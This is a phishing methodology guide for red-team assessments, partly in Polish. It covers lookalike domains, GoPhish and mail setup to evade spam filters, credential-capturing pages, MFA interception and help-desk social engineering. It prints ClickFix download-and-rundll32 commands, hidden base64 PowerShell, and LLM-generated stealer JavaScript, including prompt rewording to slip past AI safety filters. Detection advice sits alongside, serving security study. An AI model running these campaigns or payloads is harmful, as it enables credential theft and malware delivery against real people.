# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Wybierz **victim domain**.
2. Wykonaj podstawową enumerację web, **szukając login portals** używanych przez ofiarę i **zdecyduj**, który z nich będziesz **impersonate**.
3. Użyj **OSINT**, aby **znaleźć emails**.
2. Prepare the environment
1. **Kup domain**, którego zamierzasz użyć do phishing assessment
2. **Skonfiguruj email service** powiązane rekordy (SPF, DMARC, DKIM, rDNS)
3. Skonfiguruj VPS z **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** do kradzieży credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Nazwa domain **zawiera** ważny **keyword** oryginalnej domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Zmień **dot na hyphen** w subdomain (e.g., www-zelster.com).
- **New TLD**: Ta sama domain używając **new TLD** (e.g., zelster.org)
- **Homoglyph**: **Zastępuje** literę w domain name **literami wyglądającymi podobnie** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Zamienia miejscami dwie litery** w domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Dodaje lub usuwa “s” na końcu domain name (e.g., zeltsers.com).
- **Omission**: **Usuwa jedną** z liter z domain name (e.g., zelser.com).
- **Repetition:** **Powtarza jedną** z liter w domain name (e.g., zeltsser.com).
- **Replacement**: Jak homoglyph, ale mniej stealthy. Zastępuje jedną z liter w domain name, być może literą znajdującą się blisko oryginalnej litery na keyboardzie (e.g, zektser.com).
- **Subdomained**: Wprowadza **dot** wewnątrz domain name (e.g., ze.lster.com).
- **Insertion**: **Wstawia literę** do domain name (e.g., zerltser.com).
- **Missing dot**: Dołącza TLD do domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że jeden z pewnych bitów przechowywanych lub przesyłanych może zostać automatycznie odwrócony** z powodu różnych czynników, takich jak solar flares, cosmic rays lub hardware errors.

Gdy ta koncepcja jest **stosowana do DNS requests**, możliwe jest, że **domain received by the DNS server** nie będzie taka sama jak domain początkowo requested.

Na przykład pojedyncza modyfikacja bitu w domain "windows.com" może zmienić ją na "windnws.com."

Atakujący mogą **wykorzystać to, rejestrując wiele bit-flipping domains** podobnych do domain ofiary. Ich intencją jest przekierowanie legalnych users na własną infrastrukturę.

Więcej informacji: [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Możesz przeszukać [https://www.expireddomains.net/](https://www.expireddomains.net) w poszukiwaniu expired domain, którego mógłbyś użyć.\
Aby upewnić się, że expired domain, który zamierzasz kupić, **ma już dobrą SEO**, możesz sprawdzić, jak jest sklasyfikowany w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **odkryć więcej** valid email addresses lub **zweryfikować te**, które już odkryłeś, możesz sprawdzić, czy da się je brute-force'ować na smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto nie zapomnij, że jeśli users używają **jakiegokolwiek web portal do dostępu do maili**, możesz sprawdzić, czy jest podatny na **username brute force**, i jeśli to możliwe, wykorzystać podatność.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz i rozpakuj to w `/opt/gophish` i uruchom `/opt/gophish/gophish`\
Otrzymasz password dla użytkownika admin na porcie 3333 w output. Następnie uzyskaj dostęp do tego portu i użyj tych credentials, aby zmienić admin password. Możesz potrzebować tunelować ten port do local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed tym krokiem powinieneś mieć **już kupioną domenę**, której zamierzasz użyć, i musi ona **wskazywać** na **IP VPS-a**, na którym konfigurujesz **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracja Mail**

Zacznij od instalacji: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień także wartości następujących zmiennych wewnątrz /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmodyfikuj pliki **`/etc/hostname`** i **`/etc/mailname`** na nazwę swojej domeny i **zrestartuj swój VPS.**

Teraz utwórz rekord **DNS A** dla `mail.<domain>` wskazujący na **adres IP** VPS oraz rekord **DNS MX** wskazujący na `mail.<domain>`

Teraz przetestuj wysyłanie emaila:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracja Gophish**

Zatrzymaj wykonywanie gophish i skonfigurujmy go.\
Zmodyfikuj `/opt/gophish/config.json` na następujący (zwróć uwagę na użycie https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Skonfiguruj usługę gophish**

Aby utworzyć usługę gophish, tak aby mogła być uruchamiana automatycznie i zarządzana jako usługa, możesz utworzyć plik `/etc/init.d/gophish` z następującą zawartością:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dokończ konfigurację usługi i sprawdź ją, wykonując:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurowanie serwera pocztowego i domeny

### Poczekaj i bądź wiarygodny

Im starsza jest domena, tym mniejsze prawdopodobieństwo, że zostanie uznana za spam. Dlatego powinieneś poczekać jak najdłużej to możliwe (co najmniej 1 tydzień) przed phishing assessment. Co więcej, jeśli umieścisz stronę dotyczącą sektora o dobrej reputacji, uzyskana reputacja będzie lepsza.

Zauważ, że nawet jeśli musisz poczekać tydzień, możesz dokończyć konfigurację wszystkiego już teraz.

### Skonfiguruj rekord Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który rozwiązuje adres IP VPS do nazwy domeny.

### Sender Policy Framework (SPF) Record

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć [https://www.spfwizard.net/](https://www.spfwizard.net) do wygenerowania swojej polityki SPF (użyj IP maszyny VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

To jest zawartość, która musi zostać ustawiona wewnątrz rekordu TXT w domenie:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekord Domain-based Message Authentication, Reporting & Conformance (DMARC)

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący hostname `_dmarc.<domain>` z następującą zawartością:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ten tutorial opiera się na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Musisz połączyć oba wartości B64, które generuje klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Przetestuj wynik konfiguracji e-mail

Możesz to zrobić, używając [https://www.mail-tester.com/](https://www.mail-tester.com)\
Po prostu wejdź na stronę i wyślij e-mail na adres, który podadzą:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Możesz także **sprawdzić konfigurację email** wysyłając email na `check-auth@verifier.port25.com` i **odczytując odpowiedź** (w tym celu będziesz musiał **otworzyć** port **25** i zobaczyć odpowiedź w pliku _/var/mail/root_, jeśli wyślesz email jako root).\
Sprawdź, czy przechodzisz wszystkie testy:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Możesz też wysłać **wiadomość na Gmaila pod Twoją kontrolą** i sprawdzić **nagłówki emaila** w skrzynce odbiorczej Gmaila; `dkim=pass` powinno być obecne w polu nagłówka `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez spamhouse. Możesz poprosić o usunięcie swojej domeny/IP tutaj: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Możesz poprosić o usunięcie swojej domeny/IP tutaj: [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Ustaw **nazwę identyfikującą** profil nadawcy
- Zdecyduj, z którego konta będziesz wysyłać phishing emails. Sugestie: _noreply, support, servicedesk, salesforce..._
- Możesz zostawić pola username i password puste, ale upewnij się, że zaznaczysz Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zaleca się użycie funkcji "**Send Test Email**", aby sprawdzić, czy wszystko działa.\
> Polecałbym wysyłać test emails na adresy 10min mails, aby uniknąć blacklisted podczas testów.

### Email Template

- Ustaw **nazwę identyfikującą** szablon
- Następnie napisz **subject** (nic dziwnego, po prostu coś, co mógłbyś oczekiwać zobaczyć w zwykłym email)
- Upewnij się, że zaznaczyłeś "**Add Tracking Image**"
- Napisz **email template** (możesz używać zmiennych jak w poniższym przykładzie):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Send an email to a **nieistniejący adres** and check if the response has any signature.
- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
- Try to contact **some valid discovered** email and wait for the response

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Write a **name**
- **Write the HTML code** of the web page. Note that you can **import** web pages.
- Mark **Capture Submitted Data** and **Capture Passwords**
- Set a **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Usually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache server) **until you like the results.** Then, write that HTML code in the box.\
> Note that if you need to **use some static resources** for the HTML (maybe some CSS and JS pages) you can save them in _**/opt/gophish/static/endpoint**_ and then access them from _**/static/\<filename>**_

> [!TIP]
> For the redirection you could **redirect the users to the legit main web page** of the victim, or redirect them to _/static/migration.html_ for example, put some **spinning wheel (**[**https://loading.io/**](https://loading.io)**) for 5 seconds and then indicate that the process was successful**.

### Users & Groups

- Set a name
- **Import the data** (note that in order to use the template for the example you need the firstname, last name and email address of each user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Finally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the group. Note that the URL will be the link sent to the victims

Note that the **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

Once everything is ready, just launch the campaign!

## Website Cloning

If for any reason you want to clone the website check the following page:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In some phishing assessments (mainly for Red Teams) you will want to also **send files containing some kind of backdoor** (maybe a C2 or maybe just something that will trigger an authentication).\
Check out the following page for some examples:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

The previous attack is pretty clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't put the correct password or if the application you faked is configured with 2FA, **this information won't allow you to impersonate the tricked user**.

This is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) and [**muraena**](https://github.com/muraenateam/muraena) are useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:

1. You **impersonate the login** form of the real webpage.
2. The user **send** his **credentials** to your fake page and the tool send those to the real webpage, **checking if the credentials work**.
3. If the account is configured with **2FA**, the MitM page will ask for it and once the **user introduces** it the tool will send it to the real web page.
4. Once the user is authenticated you (as attacker) will have **captured the credentials, the 2FA, the cookie and any information** of every interaction your while the tool is performing a MitM.

### Via VNC

What if instead of **sending the victim to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\
You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviously one of the best ways to know if you have been busted is to **search your domain inside blacklists**. If it appears listed, somehow your domain was detected as suspicions.\
One easy way to check if you domain appears in any blacklist is to use [https://malwareworld.com/](https://malwareworld.com)

However, there are other ways to know if the victim is **actively looking for suspicions phishing activity in the wild** as explained in:


{{#ref}}
detecting-phising.md
{{#endref}}

You can **buy a domain with a very similar name** to the victims domain **and/or generate a certificate** for a **subdomain** of a domain controlled by you **containing** the **keyword** of the victim's domain. If the **victim** perform any kind of **DNS or HTTP interaction** with them, you will know that **he is actively looking** for suspicious domains and you will need to be very stealth.

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)to evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.

### Attack flow
1. Recon the victim
* Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.
* Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password / MFA reset.
2. Real-time social engineering
* Phone, Teams or chat the help-desk while impersonating the target (often with **spoofed caller-ID** or **cloned voice**).
* Provide the previously-collected PII to pass knowledge-based verification.
* Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Establish a foothold through any web SSO portal.
* Enumerate AD / AzureAD with built-ins (no binaries dropped):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.

### Detection & Mitigation
* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:
* MFA method changed + authentication from new device / geo.
* Immediate elevation of the same principal (user-→-admin).
* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
* Implement **Just-In-Time (JIT)** / **Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.

1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site` to the top search ads.
2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, then pulls a **silent loader** which decides – *in realtime* – whether to deploy:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** on *search-ads* as well as e-mail.
* Restrict software installation to signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution by policy.
* Monitor for child processes of browsers opening installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` drops the payload to `%TEMP%`, a short sleep hides network jitter, then `rundll32` calls the exported entrypoint (`notepad`).
* The DLL beacons host identity and polls C2 every few minutes. Remote tasking arrives as **base64-encoded PowerShell** executed hidden and with policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* This preserves C2 flexibility (server can swap tasks without updating the DLL) and hides console windows. Hunt for PowerShell children of `rundll32.exe` using `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` together.
* Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals after DLL load.

---

## AI-Enhanced Phishing Operations
Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** for high-risk phone requests.
• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** wygenerowany kod personalizuje przynętę (np. parsowanie tokena LogoKit) i wysyła creds do endpointu ukrytego w promptcie.

**Cechy evasion**
- Traffic trafia do dobrze znanych domen LLM lub renomowanych proxy CDN; czasem przez WebSockets do backendu.
- Brak statycznego payload; złośliwy JS istnieje dopiero po renderowaniu.
- Nieterministyczne generacje tworzą **unikalne** stealers dla każdej sesji.

**Pomysły na detection**
- Uruchamiaj sandboxy z włączonym JS; flaguj **runtime `eval`/dynamic script creation pochodzące z odpowiedzi LLM**.
- Szukaj front-endowych POSTów do API LLM natychmiast po których następuje `eval`/`Function` na zwróconym tekście.
- Alertuj o nieautoryzowanych domenach LLM w traffic klienta, a następnie o POSTach z credentials.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Poza klasycznym push-bombing, operatorzy po prostu **wymuszają nową rejestrację MFA** podczas rozmowy z help-desk, unieważniając istniejący token użytkownika.  Każdy kolejny prompt logowania wygląda dla ofiary legalnie.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoruj zdarzenia AzureAD/AWS/Okta, gdzie **`deleteMFA` + `addMFA`** występują **w ciągu kilku minut z tego samego IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą po cichu kopiować złośliwe polecenia do schowka ofiary z przejętej lub podrobionej strony internetowej, a następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub oknie terminala, wykonując dowolny kod bez pobierania ani załącznika.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Strona przynęty (np. fałszywy kanał ministerstwa/CERT) wyświetla kod QR WhatsApp Web/Desktop i instruuje ofiarę, aby go zeskanowała, po cichu dodając atakującego jako **linked device**.
* Atakujący natychmiast uzyskuje wgląd w czaty/kontakty, dopóki sesja nie zostanie usunięta. Ofiary mogą później zobaczyć powiadomienie o „new device linked”; obrońcy mogą polować na nieoczekiwane zdarzenia device-link shortly after visits to untrusted QR pages.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatorzy coraz częściej bramkują swoje przepływy phishingowe za prostym sprawdzeniem urządzenia, aby desktopowe crawlery nigdy nie dotarły do końcowych stron. Częsty wzorzec to mały skrypt, który testuje DOM z obsługą dotyku i wysyła wynik do endpointu serwera; klienci non‑mobile otrzymują HTTP 500 (lub pustą stronę), podczas gdy użytkownicy mobile otrzymują pełny flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (uproszczona):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Zachowanie serwera często obserwowane:
- Ustawia session cookie podczas pierwszego load.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (albo placeholder) dla kolejnych GET-ów, gdy `is_mobile=false`; serwuje phishing tylko jeśli `true`.

Heurystyki hunting i detection:
- zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla non‑mobile; legalne mobile victim paths zwracają 200 z dalszym HTML/JS.
- Block lub scrutinize pages, które condition content wyłącznie na `ontouchstart` lub podobnych device checks.

Wskazówki defence:
- Uruchamiaj crawlers z mobile-like fingerprints i JS enabled, aby ujawnić gated content.
- Alert na suspicious 500 responses po `POST /detect` na newly registered domains.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
